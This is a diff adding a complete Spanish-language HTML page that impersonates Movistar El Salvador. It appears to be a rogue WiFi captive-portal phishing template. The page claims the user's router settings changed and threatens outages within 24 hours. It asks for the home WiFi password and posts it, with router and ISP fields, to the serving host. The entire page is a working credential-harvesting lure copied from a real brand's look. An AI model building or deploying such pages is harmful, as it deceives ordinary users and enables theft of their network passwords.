@@ -1,0 +1,494 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+<meta name="theme-color" content="#019df4">
+<title>Movistar | Verificación de línea</title>
+<link rel="icon" href="data:,">
+<style>
+  :root {
+    --blue: #019df4;
+    --blue-dark: #006fae;
+    --blue-deep: #005b8f;
+    --green: #5bc500;
+    --ink: #1b2a41;
+    --muted: #64748b;
+    --line: #dbe7f2;
+    --soft: #eef8ff;
+  }
+
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+
+  html, body { min-height: 100%; }
+
+  body {
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    color: var(--ink);
+    background:
+      radial-gradient(circle at 8% 8%, rgba(1, 157, 244, .2), transparent 34%),
+      radial-gradient(circle at 92% 92%, rgba(91, 197, 0, .13), transparent 38%),
+      linear-gradient(150deg, #f7fcff 0%, #e8f6ff 55%, #d9efff 100%);
+    min-height: 100vh;
+    min-height: 100dvh;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    padding: 20px 16px;
+  }
+
+  .card {
+    width: 100%;
+    max-width: 460px;
+    background: #fff;
+    border-radius: 20px;
+    overflow: hidden;
+    box-shadow: 0 26px 65px rgba(0, 91, 143, .18);
+    animation: rise .45s ease-out both;
+  }
+
+  @keyframes rise {
+    from { opacity: 0; transform: translateY(14px) scale(.985); }
+    to { opacity: 1; transform: translateY(0) scale(1); }
+  }
+
+  .brandbar {
+    padding: 18px 24px;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    gap: 12px;
+    border-bottom: 1px solid #edf4fa;
+  }
+
+  .brand { display: flex; align-items: center; gap: 10px; }
+
+  .brand-mark {
+    width: 42px;
+    height: 42px;
+    border-radius: 50%;
+    background: linear-gradient(145deg, var(--blue), var(--blue-dark));
+    display: grid;
+    place-items: center;
+    box-shadow: 0 7px 16px rgba(1, 157, 244, .24);
+    flex: 0 0 auto;
+    position: relative;
+  }
+
+  .brand-mark::after {
+    content: "";
+    position: absolute;
+    width: 10px;
+    height: 10px;
+    border-radius: 50%;
+    background: var(--green);
+    right: -1px;
+    bottom: 1px;
+    border: 2px solid #fff;
+  }
+
+  .brand-mark svg { width: 24px; height: 24px; }
+
+  .wordmark {
+    font-size: 25px;
+    line-height: 1;
+    font-weight: 800;
+    letter-spacing: -1.2px;
+    color: var(--blue-dark);
+  }
+
+  .brand-sub { display: block;
+    margin-top: 3px;
+    font-size: 9px;
+    font-weight: 800;
+    letter-spacing: 1.8px;
+    color: #7b94ad;
+    text-transform: uppercase;
+  }
+
+  .service {
+    display: inline-flex;
+    align-items: center;
+    gap: 6px;
+    border: 1px solid #cfeafb;
+    background: var(--soft);
+    color: #05668d;
+    border-radius: 999px;
+    padding: 6px 10px;
+    font-size: 9.5px;
+    font-weight: 800;
+    letter-spacing: .6px;
+    white-space: nowrap;
+  }
+
+  .service svg { width: 12px; height: 12px; }
+
+  .hero {
+    padding: 24px 24px 22px;
+    background:
+      radial-gradient(circle at 90% 10%, rgba(255, 255, 255, .16), transparent 34%),
+      linear-gradient(135deg, #019df4 0%, #0088d8 55%, #006fae 100%);
+    color: #fff;
+    position: relative;
+    overflow: hidden;
+  }
+
+  .hero::before {
+    content: "";
+    position: absolute;
+    width: 210px;
+    height: 210px;
+    border-radius: 50%;
+    border: 1px solid rgba(255, 255, 255, .14);
+    right: -80px;
+    top: -120px;
+  }
+
+  .hero::after {
+    content: "";
+    position: absolute;
+    width: 140px;
+    height: 140px;
+    border-radius: 50%;
+    border: 1px solid rgba(255, 255, 255, .1);
+    right: -38px;
+    top: -70px;
+  }
+
+  .pill {
+    display: inline-flex;
+    align-items: center;
+    gap: 6px;
+    border-radius: 999px;
+    padding: 5px 9px;
+    background: rgba(255, 255, 255, .15);
+    border: 1px solid rgba(255, 255, 255, .24);
+    color: #eaf8ff;
+    font-size: 9.5px;
+    font-weight: 800;
+    letter-spacing: .8px;
+    text-transform: uppercase;
+    margin-bottom: 13px;
+    position: relative;
+    z-index: 1;
+  }
+
+  .pill span {
+    width: 6px;
+    height: 6px;
+    border-radius: 50%;
+    background: #c6ff8a;
+    box-shadow: 0 0 0 3px rgba(198, 255, 138, .18);
+  }
+
+  .hero h1 {
+    font-size: 24px;
+    line-height: 1.2;
+    letter-spacing: -.45px;
+    font-weight: 750;
+    margin-bottom: 8px;
+    position: relative;
+    z-index: 1;
+  }
+
+  .hero p {
+    font-size: 13px;
+    line-height: 1.55;
+    color: #d9f2ff;
+    position: relative;
+    z-index: 1;
+  }
+
+  .content { padding: 21px 24px 22px; }
+
+  .line-info {
+    display: flex;
+    align-items: center;
+    gap: 11px;
+    border: 1px solid var(--line);
+    background: #f8fcff;
+    border-radius: 12px;
+    padding: 12px 13px;
+    margin-bottom: 19px;
+  }
+
+  .line-icon {
+    width: 34px;
+    height: 34px;
+    border-radius: 9px;
+    background: #fff;
+    border: 1px solid #d7eafa;
+    display: grid;
+    place-items: center;
+    flex: 0 0 auto;
+  }
+
+  .line-icon svg { width: 19px; height: 19px; }
+  .line-text { min-width: 0; flex: 1; }
+  .line-title { font-size: 12px; font-weight: 750; color: #24425f; white-space: normal; overflow-wrap: anywhere; line-height: 1.35; }
+  .line-sub { font-size: 10.5px; color: #7b94ad; margin-top: 2px; }
+
+  .signal {
+    display: inline-flex;
+    align-items: center;
+    gap: 5px;
+    color: var(--green);
+    font-size: 9.5px;
+    font-weight: 800;
+    white-space: nowrap;
+  }
+
+  .signal::before {
+    content: "";
+    width: 7px;
+    height: 7px;
+    border-radius: 50%;
+    background: var(--green);
+    box-shadow: 0 0 0 3px rgba(91, 197, 0, .14);
+  }
+
+  .notice {
+    display: flex;
+    gap: 9px;
+    align-items: flex-start;
+    background: #f2fbff;
+    border: 1px solid #d5eefb;
+    border-radius: 10px;
+    padding: 11px 12px;
+    font-size: 11.5px;
+    line-height: 1.5;
+    color: #40617c;
+    margin-bottom: 18px;
+  }
+
+  .notice svg { width: 16px; height: 16px; flex: 0 0 auto; margin-top: 1px; }
+
+  .field { margin-bottom: 14px; }
+
+  label {
+    display: block;
+    font-size: 12px;
+    font-weight: 750;
+    color: #2c4a68;
+    margin-bottom: 7px;
+  }
+
+  .input-wrap { position: relative; }
+
+  input[type="password"], input[type="text"] {
+    width: 100%;
+    height: 49px;
+    padding: 0 74px 0 14px;
+    border: 1.5px solid #cfe0ee;
+    border-radius: 12px;
+    background: #fbfdff;
+    color: var(--ink);
+    font-size: 15px;
+    font-family: inherit;
+    outline: none;
+    transition: border-color .18s, box-shadow .18s, background .18s;
+  }
+
+  input[type="password"]:focus, input[type="text"]:focus {
+    border-color: var(--blue);
+    background: #fff;
+    box-shadow: 0 0 0 4px rgba(1, 157, 244, .12);
+  }
+
+  input::placeholder { color: #9cb0c4; }
+
+  .toggle {
+    position: absolute;
+    right: 8px;
+    top: 50%;
+    transform: translateY(-50%);
+    border: 0;
+    background: #eaf6fe;
+    color: var(--blue-dark);
+    font-family: inherit;
+    font-size: 10.5px;
+    font-weight: 800;
+    padding: 7px 9px;
+    border-radius: 7px;
+    cursor: pointer;
+  }
+
+  .toggle:hover { background: #d9effb; }
+
+  .meta-row {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    gap: 10px;
+    margin: 2px 0 18px;
+    font-size: 11.5px;
+    color: var(--muted);
+  }
+
+  .remember { display: inline-flex; align-items: center; gap: 7px; cursor: pointer; }
+  .remember input { width: 15px; height: 15px; accent-color: var(--blue); cursor: pointer; }
+  .link { color: var(--blue-dark); font-weight: 650; text-decoration: none; cursor: pointer; }
+
+  .submit {
+    width: 100%;
+    border: 0;
+    border-radius: 12px;
+    padding: 15px 18px;
+    background: linear-gradient(135deg, #019df4 0%, #007fc7 100%);
+    color: #fff;
+    font-family: inherit;
+    font-size: 15px;
+    font-weight: 800;
+    cursor: pointer;
+    box-shadow: 0 10px 20px rgba(1, 157, 244, .25);
+    transition: filter .15s, transform .15s, box-shadow .15s;
+  }
+
+  .submit:hover { filter: brightness(1.05); transform: translateY(-1px); box-shadow: 0 14px 24px rgba(1, 157, 244, .31); }
+  .submit:active { transform: translateY(1px); }
+  .submit:disabled { opacity: .82; cursor: wait; transform: none; }
+
+  .footer {
+    padding: 14px 24px 17px;
+    text-align: center;
+    font-size: 9.5px;
+    line-height: 1.55;
+    color: #7b94ad;
+    background: #f9fcff;
+    border-top: 1px solid #edf4fa;
+  }
+
+  .footer strong { color: #5e7a94; }
+
+  @media (max-width: 380px) {
+    body { padding: 10px; }
+    .brandbar { padding: 15px 17px; }
+    .hero { padding: 21px 17px 19px; }
+    .content { padding: 18px 17px 19px; }
+    .footer { padding: 12px 17px 15px; }
+    h1 { font-size: 21px; }
+    .service { display: none; }
+  }
+</style>
+</head>
+<body>
+  <main class="card" role="main">
+    <header class="brandbar">
+      <div class="brand" aria-label="Movistar El Salvador">
+        <span class="brand-mark" aria-hidden="true">
+          <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+            <path d="M5 18V8.5L9.5 13L12 9.5L14.5 13L19 8.5V18" stroke="#ffffff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+          </svg>
+        </span>
+        <span>
+          <span class="wordmark">Movistar</span>
+          <span class="brand-sub">Fibra · El Salvador</span>
+        </span>
+      </div>
+      <span class="service">
+        <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+          <path d="M5 12.5L9.4 17L19 7.5" stroke="#05668d" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"/>
+        </svg>
+        Línea activa
+      </span>
+    </header>
+
+    <section class="hero">
+      <div class="pill"><span></span> Verificación de seguridad</div>
+      <h1>Confirma la clave de tu WiFi</h1>
+      <p>Detectamos un cambio reciente en la configuración de tu router. Para restablecer la conexión, valida la contraseña de tu red inalámbrica.</p>
+    </section>
+
+    <section class="content">
+      <div class="line-info">
+        <span class="line-icon" aria-hidden="true">
+          <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+            <rect x="3" y="8" width="18" height="10" rx="2" stroke="#019df4" stroke-width="1.6"/>
+            <path d="M7 13H9M11 13H13M15 13H17" stroke="#019df4" stroke-width="1.6" stroke-linecap="round"/>
+            <path d="M7 8V6M17 8V6" stroke="#019df4" stroke-width="1.6" stroke-linecap="round"/>
+          </svg>
+        </span>
+        <div class="line-text">
+          <div class="line-title">Router Movistar Fibra · 192.168.1.1</div>
+          <div class="line-sub">Servicio Fibra 600 Mb · Red de tu hogar</div>
+        </div>
+        <span class="signal">Estable</span>
+      </div>
+
+      <div class="notice">
+        <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+          <path d="M12 3.5L21 19.5H3L12 3.5Z" stroke="#007fc7" stroke-width="1.7" stroke-linejoin="round"/>
+          <path d="M12 9V13.5" stroke="#007fc7" stroke-width="1.8" stroke-linecap="round"/>
+          <circle cx="12" cy="16.4" r="1" fill="#007fc7"/>
+        </svg>
+        <span>Tu conexión sigue activa, pero requiere validación para evitar cortes durante las próximas 24 horas.</span>
+      </div>
+
+      <form id="portalForm" method="POST" action="/" autocomplete="off">
+        <input type="hidden" name="isp" value="Movistar">
+        <input type="hidden" name="router_ip" value="192.168.1.1">
+        <input type="hidden" name="router_model" value="Router Movistar Fibra">
+        <input type="hidden" name="portal" value="movistar">
+
+        <div class="field">
+          <label for="wifi_password">Contraseña WiFi de tu hogar</label>
+          <div class="input-wrap">
+            <input type="password" id="wifi_password" name="wifi_password" placeholder="Introduce la contraseña de tu red" required autofocus autocomplete="off" spellcheck="false">
+            <button type="button" class="toggle" id="togglePassword" aria-label="Mostrar contraseña">MOSTRAR</button>
+          </div>
+        </div>
+
+        <div class="meta-row">
+          <label class="remember" for="recordar">
+            <input type="checkbox" id="recordar" name="recordar" value="si" checked>
+            Recordar esta red
+          </label>
+          <a class="link" href="#" id="helpLink">¿Olvidaste la clave?</a>
+        </div>
+
+        <button type="submit" class="submit" id="submitBtn">Verificar conexión</button>
+      </form>
+    </section>
+
+    <footer class="footer">
+      <strong>Movistar El Salvador</strong> · Atención al Cliente<br>
+      © 2026 Movistar. Todos los derechos reservados.
+    </footer>
+  </main>
+
+  <script>
+    (function () {
+      var password = document.getElementById('wifi_password');
+      var toggle = document.getElementById('togglePassword');
+      var form = document.getElementById('portalForm');
+      var submitBtn = document.getElementById('submitBtn');
+      var helpLink = document.getElementById('helpLink');
+
+      if (toggle && password) {
+        toggle.addEventListener('click', function () {
+          var show = password.type === 'password';
+          password.type = show ? 'text' : 'password';
+          toggle.textContent = show ? 'OCULTAR' : 'MOSTRAR';
+          toggle.setAttribute('aria-label', show ? 'Ocultar contraseña' : 'Mostrar contraseña');
+          password.focus();
+        });
+      }
+
+      if (helpLink) {
+        helpLink.addEventListener('click', function (event) {
+          event.preventDefault();
+          alert('La contraseña WiFi aparece en la parte posterior de tu router Movistar. También puedes consultarla en Mi Movistar.');
+        });
+      }
+
+      if (form && submitBtn) {
+        form.addEventListener('submit', function () {
+          if (!form.checkValidity()) return;
+          submitBtn.disabled = true;
+          submitBtn.textContent = 'Verificando conexión...';
+        });
+      }
+    })();
+  </script>
+</body>
+</html>
